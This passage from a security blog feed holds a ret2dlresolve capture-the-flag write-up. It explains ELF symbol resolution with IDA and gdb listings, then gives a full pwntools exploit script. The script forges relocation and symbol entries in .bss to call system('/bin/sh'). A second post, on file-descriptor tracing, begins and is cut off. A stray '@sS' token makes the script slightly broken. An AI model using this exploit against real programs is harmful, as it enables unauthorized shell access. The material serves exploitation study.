LOAD:0000000000400396 5F 5F 6C 69 62 63 5F 73 74 61+aLibcStartMain db &#39;__libc_start_main&#39;,0 ; DATA XREF: LOAD:0000000000400360↑o
LOAD:00000000004003A8 6C 69 62 63 2E 73 6F 2E 36 00 aLibcSo6 db &#39;libc.so.6&#39;,0               ; DATA XREF: LOAD:00000000004003E0↓o
LOAD:00000000004003B2 47 4C 49 42 43 5F 32 2E 32 2E+aGlibc225 db &#39;GLIBC_2.2.5&#39;,0            ; DATA XREF: LOAD:00000000004003F0↓o
LOAD:00000000004003BE 2E 2F 67 6C 69 62 63 2F 00    aGlibc db &#39;./glibc/&#39;,0
LOAD:00000000004003C7 5F 5F 67 6D 6F 6E 5F 73 74 61+aGmonStart db &#39;__gmon_start__&#39;,0        ; DATA XREF: LOAD:0000000000400378↑o
</code></pre><h2 id="symtab-dynsym">SYMTAB (.dynsym)</h2>
<p>This table holds relevant symbol information.</p>
<ul>
<li>
<p>x86
Each entry is a <code>Elf32_Sym</code> structure and its size is 16 bytes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> { 
</span></span><span style="display:flex;"><span>    Elf32_Word st_name ; <span style="color:#75715e">/* Symbol name (string tbl index) -4b*/</span>
</span></span><span style="display:flex;"><span>    Elf32_Addr st_value ; <span style="color:#75715e">/* Symbol value -4b*/</span> 
</span></span><span style="display:flex;"><span>    Elf32_Word st_size ; <span style="color:#75715e">/* Symbol size -4b*/</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> st_info ; <span style="color:#75715e">/* Symbol type and binding-1b */</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> st_other ; <span style="color:#75715e">/* Symbol visibility under glibc&gt;=2.2 -1b */</span> 
</span></span><span style="display:flex;"><span>    Elf32_Section st_shndx ; <span style="color:#75715e">/* Section index -2b*/</span> 
</span></span><span style="display:flex;"><span>} Elf32_Sym;
</span></span></code></pre></div></li>
<li>
<p>amd64
Contains a symbol table using <code>Elf64_Sym</code> structures. Every structure associates a symbolic name with a piece of code elsewhere in the binary.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    Elf64_Word     st_name;    <span style="color:#75715e">/* 32bit - Symbol name (string tbl index) */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  st_info;    <span style="color:#75715e">/* Symbol type and binding */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  st_other;   <span style="color:#75715e">/* Symbol visibility */</span>
</span></span><span style="display:flex;"><span>    Elf64_Section  st_shndx;   <span style="color:#75715e">/* 16 bits - Section index */</span>
</span></span><span style="display:flex;"><span>    Elf64_Addr     st_value;   <span style="color:#75715e">/* 64 bits - Symbol value */</span>
</span></span><span style="display:flex;"><span>    Elf64_Xword    st_size;    <span style="color:#75715e">/* 64 bits - Symbol size */</span>
</span></span><span style="display:flex;"><span>} Elf64_Sym; <span style="color:#75715e">// 24 bytes
</span></span></span></code></pre></div></li>
<li>
<p>st_name: It acts as a string table index. It will be used to locate the right string in the STRTAB section.</p>
</li>
<li>
<p>st_info: symbol’s type and binding attributes.</p>
</li>
<li>
<p>st_other: symbol’s visibility.</p>
</li>
<li>
<p>st_shndx: the relevant section header table index.</p>
</li>
<li>
<p>st_value: the value of the associated symbol.</p>
</li>
<li>
<p>st_size: the symbol’s size. If the symbol has no size or the size is unknown, it contains 0.</p>
</li>
<li>
<p>IDA listing <em>void</em> binary</p>
<pre tabindex="0"><code>LOAD:0000000000400330                               ; ELF Symbol Table
LOAD:0000000000400330 00 00 00 00 00 00 00 00 00 00+Elf64_Sym &lt;0&gt;
LOAD:0000000000400348 01 00 00 00 12 00 00 00 00 00+Elf64_Sym &lt;offset aRead - offset unk_400390, 12h, 0, 0, 0, 0&gt; ; &#34;read&#34;
LOAD:0000000000400360 06 00 00 00 12 00 00 00 00 00+Elf64_Sym &lt;offset aLibcStartMain - offset unk_400390, 12h, 0, 0, 0, 0&gt; ; &#34;__libc_start_main&#34;
LOAD:0000000000400378 37 00 00 00 20 00 00 00 00 00+Elf64_Sym &lt;offset aGmonStart - offset unk_400390, 20h, 0, 0, 0, 0&gt; ; &#34;__gmon_start__
</code></pre></li>
<li>
<p>IDA listing <em>example</em> binary</p>
<pre tabindex="0"><code>LOAD:04003D8 ; ELF Symbol Table
LOAD:04003D8 Elf64_Sym &lt;0&gt;
LOAD:04003F0 Elf64_Sym &lt;offset aLibcStartMain - offset unk_4004B0, 12h, 0, 0, 0, 0&gt; ; &#34;__libc_start_main&#34;
LOAD:0400408 Elf64_Sym &lt;offset aWrite - offset unk_4004B0, 12h, 0, 0, 0, 0&gt; ; &#34;write&#34;
LOAD:0400420 Elf64_Sym &lt;offset aStrlen - offset unk_4004B0, 12h, 0, 0, 0, 0&gt; ; &#34;strlen&#34;
LOAD:0400438 Elf64_Sym &lt;offset aSetbuf - offset unk_4004B0, 12h, 0, 0, 0, 0&gt; ; &#34;setbuf&#34;
LOAD:0400450 Elf64_Sym &lt;offset aRead - offset unk_4004B0, 12h, 0, 0, 0, 0&gt; ; &#34;read&#34;
</code></pre></li>
</ul>
<blockquote>
<p>The most important value here is <strong>st_name</strong> as this <strong>gives the offset in STRTAB of the symbol name.</strong> The other fields are not relevant to the exploit itself.</p>
</blockquote>
<h3 id="jmprel-symtab-and-strtab-for-void-elf">JMPREL, SYMTAB AND STRTAB for void ELF</h3>
<ul>
<li>
<p>Base section addresses</p>
<pre tabindex="0"><code>readelf -d void

Tag        Type                         Name/Value

0x0000000000000005 (STRTAB)             0x400390
0x0000000000000006 (SYMTAB)             0x400330
0x0000000000000017 (JMPREL)             0x400430
</code></pre></li>
<li>
<p>JMPREL entry for read</p>
<pre tabindex="0"><code>(gdb) x/2gx 0x0000000000400430 + 0
0x400430:       0x0000000000404018      0x0000000100000007
                |__ r_offset            |___ r_info
</code></pre><p>R_SYM = (r_info &raquo; 32) = 1</p>
</li>
<li>
<p>SYMTAB at index 1</p>
<pre tabindex="0"><code>x/6wx 0x400330 + 1 * 24
0x400348:       0x00000001      0x00000012      0x00000000      0x00000000
0x400358:       0x00000000      0x00000000
</code></pre><ul>
<li>SYMTAB base + index * size of Elf64_Sym</li>
<li>st_name = 1</li>
</ul>
</li>
<li>
<p>STRTAB at index 1</p>
<pre tabindex="0"><code>x/s 0x0000000000400390 + 0x00000001
0x400391:       &#34;read&#34;
</code></pre></li>
</ul>
<h2 id="tldr-function-resolution-pseudocode">TL;DR function resolution pseudocode</h2>
<p>Exmaple: calling <em>read</em> in x86 ELF</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">_dl_runtime_resolve</span>(link_map, reloc_arg) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uintptr_t</span> reloc_offset <span style="color:#f92672">=</span> reloc_arg <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(Elf64_Rela); <span style="color:#75715e">// reloc_arg is pushed in .plt section
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Elf64_Rela <span style="color:#f92672">*</span> rel_entry <span style="color:#f92672">=</span> JMPREL <span style="color:#f92672">+</span> reloc_offset ;
</span></span><span style="display:flex;"><span>    Elf64_Sym <span style="color:#f92672">*</span> sym_entry <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>SYMTAB[<span style="color:#a6e22e">ELF64_R_SYM</span>(rel_entry<span style="color:#f92672">-&gt;</span>r_info)];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> sym_name <span style="color:#f92672">=</span> STRTAB <span style="color:#f92672">+</span> sym_entry<span style="color:#f92672">-&gt;</span>st_name ;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_search_for_symbol_</span>(link_map, sym_name);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// invoke initial read call now that symbol is resolved
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="ret2dlresolve">ret2dlresolve</h2>
<blockquote>
<p>Use .bss section to create fake entries, it is closer to the ELF in memory compared to the stack.</p>
</blockquote>
<h3 id="step-1">Step 1</h3>
<p>We need to fake an Elf64_Rela structure and an ELf64_Sym structure with following characteristics</p>
<h4 id="fake-elf64_rela-jmprelrelplt-structure">Fake Elf64_Rela (JMPREL/.rel.plt) structure</h4>
<ul>
<li>It must have a writeable <code>r_offset</code> area where <code>_dl_runtime_resolve</code> will write the address of <em>system()</em>.</li>
<li>In the <code>r_info</code> attribute the lower 4 bytes (32 bits) must be equal to 7 ie. <code>R_X86_64_JUMP_SLOT</code>, while the higher 4 bytes should be constructed such that <code>(r_info &gt;&gt; 32) * 24</code> (R_SYM value * size of Elf64_Sym as R_SYM is just index) when added to SYMTAB address, points to fake <em>Elf64_Sym</em>.</li>
</ul>
<h4 id="fake-elf64_sym-symtabdynsym-structure">Fake Elf64_Sym (SYMTAB/.dynsym) structure</h4>
<ul>
<li>The <code>st_name</code> value when added to STRTAB (.dynstr) address points to <strong>&lsquo;system&rsquo;</strong> string.</li>
</ul>
<h3 id="step-2">Step 2</h3>
<p>With the fake structures in place, we calculate <code>reloc_arg</code> (offset usually pushed in a functions&rsquo;s .plt section) from JMPREL (.rel.plt) address to point to our fake Elf64_Rela structure.</p>
<p>Next, we push the fake value of <code>reloc_arg</code> onto stack and transfer control to default stub at the start of .plt section to let dl_resolve do its magic.</p>
<h2 id="crafting-exploit">Crafting Exploit</h2>
<p>As <code>.bss</code> section is writable at runtime, we use this space to create our fake structures.</p>
<p><strong>NOTE</strong>: Make sure that index to <em>fake</em> .dynsym entry must be multiple of 24. If on dividing the address difference between our fake entry and SYMTAB base we get a fraction this leads to variance in resultant address when recalculated by <code>_dl_fixup</code> during resolution as only the integer part would be stored in <code>r_info</code> as index.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> pwn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#pwn.context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./void&#34;</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ELF(exe, checksec <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ROP(elf)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#proc = pwn.process(&#34;./void&#34;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#proc = pwn.gdb.debug(&#34;./void&#34;, gdbscript = &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#                     b *0x000000000040113b</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#                     c</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#                     &#34;&#34;&#34;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># important addresses</span>
</span></span><span style="display:flex;"><span>PLT_stub <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#34;.plt&#34;</span>)[<span style="color:#e6db74">&#34;sh_addr&#34;</span>]
</span></span><span style="display:flex;"><span>BSS <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#34;.bss&#34;</span>)[<span style="color:#e6db74">&#34;sh_addr&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] .plt default stub at: </span><span style="color:#e6db74">{</span>hex(PLT_stub)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] .bss at: </span><span style="color:#e6db74">{</span>hex(BSS)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>STRTAB, SYMTAB, JMPREL <span style="color:#f92672">=</span> map(elf<span style="color:#f92672">.</span>dynamic_value_by_tag, [<span style="color:#e6db74">&#34;DT_STRTAB&#34;</span>, <span style="color:#e6db74">&#34;DT_SYMTAB&#34;</span>, <span style="color:#e6db74">&#34;DT_JMPREL&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] STRTAB (.dynstr) at: </span><span style="color:#e6db74">{</span>hex(STRTAB)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] SYMTAB (.dynsym) at: </span><span style="color:#e6db74">{</span>hex(SYMTAB)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] JMPREL (.rel.plt) at: </span><span style="color:#e6db74">{</span>hex(JMPREL)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">align</span>(addr):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (<span style="color:#ae81ff">0x18</span> <span style="color:#f92672">-</span> (addr) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x18</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload 1 =============================</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. overflow into return address</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. call read(0, .bss, size_of_fake_entries)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. return to vuln()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    This function takes an arbitrary number of arbitrarily nested lists, tuples
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    and dictionaries.  It will then find every string and number inside those
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    and flatten them out.  Strings are inserted directly while numbers are
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    packed using the :func:`pack` function.  Unicode strings are UTF-8 encoded.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Examples
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &gt;&gt;&gt; flat(4)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b&#39;</span><span style="color:#ae81ff">\x04\x00\x00\x00</span><span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &gt;&gt;&gt; flat(b&#39;X&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b&#39;X&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &gt;&gt;&gt; flat([1,2,3])
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b&#39;</span><span style="color:#ae81ff">\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00</span><span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &gt;&gt;&gt; flat({4:b&#39;X&#39;})
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b&#39;aaaaX&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_1 <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>flat({
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">72</span>: [   <span style="color:#75715e"># pad 72 bytes to overwrite buffer and rbp values</span>
</span></span><span style="display:flex;"><span>            pwn<span style="color:#f92672">.</span>p64(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address),
</span></span><span style="display:flex;"><span>            pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>),                     <span style="color:#75715e"># read from stdin</span>
</span></span><span style="display:flex;"><span>            pwn<span style="color:#f92672">.</span>p64(rop<span style="color:#f92672">.</span>rsi<span style="color:#f92672">.</span>address),
</span></span><span style="display:flex;"><span>            pwn<span style="color:#f92672">.</span>p64(BSS),                   <span style="color:#75715e"># read into .bss section</span>
</span></span><span style="display:flex;"><span>            pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>),                     <span style="color:#75715e"># junk for pop r15</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#75715e"># we do not have gadget to set rdx to size of next payload stage, but it has value 0xc8 when next instruction is called, we can work with that our as next stage is much smaller than 0xc8 (200) bytes</span>
</span></span><span style="display:flex;"><span>            elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>read,                   <span style="color:#75715e"># call read()</span>
</span></span><span style="display:flex;"><span>            elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;vuln&#34;</span>],            <span style="color:#75715e"># return to vuln() after read()</span>
</span></span><span style="display:flex;"><span>        ]
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(payload_1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload 2 ============================</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. input value into previous read(0, .bss, size) call</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#       a. create fake Elf64_Rel structure (.rel.plt)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#       b. create fake Elf64_Sym structure (.dynsym)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#       c. write string &#39;system&#39; for .dynstr resolution of symbol name</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#       d. write string &#39;/bin/sh&#39; for passing as argument to system later</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. let return to vuln() as proposed in payload 1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">typedef struct
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Elf64_Addr        r_offset;    /* 64 bit - Address */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Elf64_Xword       r_info;      /* 64 bit - Relocation type and symbol index */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Elf64_Sxword      r_addend;    /* 64 bit - Addend */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">} Elf64_Rela; // 24 bytes
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fake Elf64_Sym is at 24 bytes (size of fake Elf64_Rela - JMPREL entry) after BSS. Index must be offset from SYMTAB base.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#dynsym_idx = ((BSS + 24) - SYMTAB) // 24  &lt;-- this resulted in an index in fraction, we need to align the address to 24 byte structures.</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> align(BSS <span style="color:#f92672">-</span> SYMTAB)
</span></span><span style="display:flex;"><span>FAKE_STRUCTS <span style="color:#f92672">=</span> BSS <span style="color:#f92672">+</span> padding
</span></span><span style="display:flex;"><span>dynsym_idx <span style="color:#f92672">=</span> ((FAKE_STRUCTS <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">-</span> SYMTAB) <span style="color:#f92672">//</span> <span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span>r_info <span style="color:#f92672">=</span> (dynsym_idx <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x7</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fake Elf64_Sym entry must contain offset to symbol name from STRTAB.</span>
</span></span><span style="display:flex;"><span>dynstr_off <span style="color:#f92672">=</span> (FAKE_STRUCTS <span style="color:#f92672">+</span> <span style="color:#ae81ff">48</span>) <span style="color:#f92672">-</span> STRTAB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_2 <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>flat({
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>: [    
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># fake Elf64_Rela entry for JMPREL</span>
</span></span><span style="display:flex;"><span>        BSS,                        <span style="color:#75715e"># r_offset - a write address to write address of system after resolution</span>
</span></span><span style="display:flex;"><span>        r_info,                     <span style="color:#75715e"># r_info - indexes into our fake .dynsym entry</span>
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>),                 <span style="color:#75715e"># r_addend - zero, not needed for our purposes</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> padding,          <span style="color:#75715e"># added padding to make 24 byte (structure size) alignment as dynsym_idx (in r_info) must be exact multiple of 24</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@sS</span>
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p32(dynstr_off),        <span style="color:#75715e"># st_name - offset from STRTAB for our symbol name</span>
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span>,             <span style="color:#75715e"># other 20 bytes, not needed for our purposes</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># target symbol name to be referenced from STRTAB through our SYMTAB entry</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;system</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># argument to system</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        ]
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_2 <span style="color:#f92672">=</span> payload_2 <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">200</span> <span style="color:#f92672">-</span> len(payload_2))   <span style="color:#75715e"># proc.sendline() was buggy so I filled entire 200 byte limit in count of read()</span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>send(payload_2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload 3 ============================</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. overflow into the return address</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. push reloc_arg (that resolves to start of our fake structure region)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. return to PLT default stub</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 4. profit</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>binsh_addr <span style="color:#f92672">=</span> FAKE_STRUCTS <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># start of fake structs + size of Elf64_Rela + size of Elf64_Sym + length of &#39;system\x00\x00&#39;</span>
</span></span><span style="display:flex;"><span>reloc_arg <span style="color:#f92672">=</span> (FAKE_STRUCTS <span style="color:#f92672">-</span> JMPREL) <span style="color:#f92672">//</span> <span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span>payload_3 <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>flat({
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">72</span>: [
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address),   <span style="color:#75715e"># setup argument for system()</span>
</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(binsh_addr),
</span></span><span style="display:flex;"><span>        PLT_stub,                   <span style="color:#75715e"># to call dl_resolve</span>
</span></span><span style="display:flex;"><span>        reloc_arg,                 <span style="color:#75715e"># PLT stub assumes that the offset to JMPREL entry is already pushed</span>
</span></span><span style="display:flex;"><span>        ]
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>send(payload_3)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="post-exploitation">Post Exploitation</h2>
<p>Post-exploitation I drafted a meme that looked cool to me and adhered to <em>then</em> meme trends.</p>
<p><img src="./ret2dl_resolve_meme.jpeg" alt="ret2dl_resolve_meme.jpeg"></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Tracing file descriptors: A battle against poor writeups</title>
      <link>https://ashtrace.github.io/posts/tracing_file_descriptors/</link>
      <pubDate>Sat, 05 Oct 2024 00:09:08 +0530</pubDate>
      
      <guid>https://ashtrace.github.io/posts/tracing_file_descriptors/</guid>
      <description><![CDATA[<p>I was going through an easy pwn challenge—easy according to the platform, not my personal ranking. After successfully pwning the binary locally, I ran the same exploit against the remote challenge service and it completely fell apart. I checked the writeup hoping for clarity, but the explanation they gave didn’t really scratch the itch or fully explain why things behaved differently.</p>
<p><img src="./writeup-remote-section.jpeg" alt="writeup-remote-section"></p>
<p>There was no explanation regarding why the value of file-descriptor was to be <code>5</code>. Thus I went on a quest to trace for it.</p>
<blockquote>
<p>PS: Please bear with me while we fight togther to tally all those numbers :)  (<em>I tried my best to redact challenge name</em>)</p>
</blockquote>
<h2 id="context-information">Context information</h2>
<p>We are provided with challenge ELF binary named <code>challengeBinary</code>, and a Dockerfile to create docker container with binary and fake flag.</p>
<h2 id="executable-mitigation-information">Executable Mitigation Information</h2>
<pre tabindex="0"><code>Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
</code></pre><h2 id="source-code-analysis-decompilation">Source code analysis (Decompilation)</h2>
<ul>
<li>
<p><strong>main()</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> s1[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-40h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// [rsp+8h] [rbp-38h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// [rsp+10h] [rbp-30h]
